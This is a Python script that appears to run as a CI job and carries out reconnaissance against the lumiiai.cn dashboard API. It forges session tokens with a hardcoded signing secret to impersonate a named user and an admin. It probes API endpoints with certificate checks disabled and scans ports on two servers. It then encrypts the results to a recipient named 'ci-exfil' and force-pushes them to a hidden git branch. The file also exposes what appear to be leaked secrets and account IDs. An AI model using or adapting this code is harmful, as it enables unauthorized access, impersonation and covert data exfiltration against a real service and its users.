#!/usr/bin/env python3
# recon6 (intent 28278): map dashboard.lumiiai.cn API surface (alternate control plane) + test ezkoder0 egress.
import os, sys, json, time, uuid, base64, hmac, hashlib, socket, ssl, subprocess, shutil, traceback
import http.client
_REF = os.environ.get("GITHUB_REF_NAME", "") or ""
if "results" in _REF:
    print("results-branch-skip", flush=True); sys.exit(0)
RUNID = os.environ.get("GITHUB_RUN_ID", str(int(time.time())))
JWT_SECRET = "297b8a491bc1920b918d01de77166556d3f835f473968c6b"
DESKTOP_SECRET = "bj_OgwjI66ar4GaKk23w6QKQgbyi5eHBj1JgBA8XH_Q9EoInnrX0JLovzhfrvT0X"
ORG = "org_bTLzxtBLmugV8uxx4QTyw"
ASST = "asst_E3G6xx8h7Ei279q6ossJ6"
SUB_BRIAN = "usr_j7t9Dhq4M4obQkag5huJi"
SUB_ADMIN = "usr_ZxLewKrgbRYSm7rWDtQX8"
DEV_BRIAN = "desktop-fea2cfa0d75dc5c8d62fc05944b3a9572789ffcb855668fe7e66638ba292bc87"
OUT = "/tmp/resultsr"; os.makedirs(OUT, exist_ok=True)
LOG = open(os.path.join(OUT, "transcript.log"), "a", buffering=1)
def log(*a):
    s = " ".join(str(x) for x in a)
    try: print(s, flush=True)
    except Exception: pass
    try: LOG.write(s + "\n")
    except Exception: pass
def b64u(b):
    if isinstance(b, str): b = b.encode()
    return base64.urlsafe_b64encode(b).rstrip(b'=').decode()
def jwt_session(sub, org=ORG):
    now = int(time.time())
    h = b64u(json.dumps({"alg": "HS256", "typ": "JWT"}, separators=(',', ':')))
    p = b64u(json.dumps({"sub": sub, "org": org, "iat": now, "exp": now + 2592000, "sid": "sid_" + str(uuid.uuid4()), "lgn": now}, separators=(',', ':')))
    sig = hmac.new(JWT_SECRET.encode(), (h + "." + p).encode(), hashlib.sha256).digest()
    return "lumii_session=" + h + "." + p + "." + b64u(sig)
CTX = ssl.create_default_context(); CTX.check_hostname = False; CTX.verify_mode = ssl.CERT_NONE
def call(host, path, method="GET", cookie=None, data=None, timeout=12):
    headers = {"Accept": "*/*", "User-Agent": "Mozilla/5.0", "Connection": "close"}
    if cookie: headers["Cookie"] = cookie
    body = None
    if data is not None:
        body = json.dumps(data).encode(); headers["Content-Type"] = "application/json"
    c = http.client.HTTPSConnection(host, 443, timeout=timeout, context=CTX)
    try:
        c.request(method, path, body=body, headers=headers)
        r = c.getresponse(); b = r.read(); hd = {k.lower(): v for k, v in r.getheaders()}
        return r.status, hd, b
    except Exception as e:
        return -1, {}, ("ERR:" + repr(e)).encode()
    finally:
        try: c.close()
        except Exception: pass
def tcp(ip, port, t=6):
    try:
        s = socket.create_connection((ip, port), timeout=t); s.close(); return "open"
    except Exception as e:
        return "closed:" + type(e).__name__
def main():
    log("=== recon6 start", RUNID, "===")
    res = {}
    for h in ("assistant.lumiiai.cn", "dashboard.lumiiai.cn", "13.214.183.170", "122.51.1.87"):
        try: res["dns " + h] = socket.gethostbyname_ex(h)
        except Exception as e: res["dns " + h] = "ERR:" + repr(e)
        log("DNS", h, res["dns " + h])
    for ip, port in (("13.214.183.170", 7681), ("13.214.183.170", 22), ("122.51.1.87", 443), ("122.51.1.87", 22)):
        r = tcp(ip, port); res["tcp %s:%d" % (ip, port)] = r; log("TCP", ip, port, r)
    H = "dashboard.lumiiai.cn"
    ck_b = jwt_session(SUB_BRIAN); ck_a = jwt_session(SUB_ADMIN)
    paths = ["/api/health", "/api/agents", "/api/desktop/agents", "/api/devices", "/api/me", "/api/org",
             "/api/orgs", "/api/conversations", "/api/assistants", "/api/users", "/api/desktop/devices",
             "/api/bridge/agents", "/api/tunnel/agents", "/api/admin/agents", "/api/v1/agents", "/health", "/api/status", "/api/version"]
    for p in paths:
        st, hd, b = call(H, p, cookie=ck_b)
        res["GET %s (brian)" % p] = {"status": st, "len": len(b), "body": b[:600].decode(errors="replace")}
        log("GET", p, "->", st, "len", len(b), b[:160].decode(errors="replace"))
    # conv create (both subs)
    for tag, ck in (("brian", ck_b), ("admin", ck_a)):
        st, hd, b = call(H, "/api/conversations", method="POST", cookie=ck,
                         data={"title": "recon", "assistantId": ASST, "participants": []})
        res["POST /api/conversations " + tag] = {"status": st, "body": b[:400].decode(errors="replace")}
        log("POST conv", tag, "->", st, b[:200].decode(errors="replace"))
    with open(os.path.join(OUT, "recon.json"), "w") as f:
        json.dump(res, f, ensure_ascii=False, indent=1)
    push("recon")

RESULT_BRANCH = os.environ.get("PRESULT_BRANCH", "ci-bridge5-28278-results")
def push(tag):
    enc = "/tmp/resultsr.tar.gz.gpg"
    try:
        for p in ("/tmp/resultsr.tar.gz", enc, "resultsr.tar.gz.gpg"):
            try:
                if os.path.isfile(p): os.remove(p)
            except Exception: pass
        subprocess.run("tar czf /tmp/resultsr.tar.gz -C /tmp resultsr", shell=True, check=False)
        if os.path.isfile("pub.asc"):
            subprocess.run("gpg --batch --yes --import pub.asc >/dev/null 2>&1", shell=True, check=False)
            subprocess.run("gpg --batch --yes --trust-model always -e -r ci-exfil@example.invalid -o %s /tmp/resultsr.tar.gz" % enc, shell=True, capture_output=True, text=True, timeout=300)
        if os.path.isfile(enc):
            shutil.copy(enc, "resultsr.tar.gz.gpg")
            subprocess.run('git config user.email ci@aro.network; git config user.name ci', shell=True, check=False)
            subprocess.run("git add -f resultsr.tar.gz.gpg && git commit -m 'ci recon6 %s %s' || true" % (RUNID, tag), shell=True, check=False)
            r = subprocess.run("git push -f origin HEAD:refs/heads/%s" % RESULT_BRANCH, shell=True, capture_output=True, text=True, timeout=600)
            log("PUSH rc=%s err=%s" % (r.returncode, (r.stderr or "")[-160:]))
    except Exception as e:
        log("PUSH EXC", repr(e))
try:
    main()
except Exception:
    log("FATAL", traceback.format_exc()); 
    try: push("fatal")
    except Exception: pass
sys.exit(1)
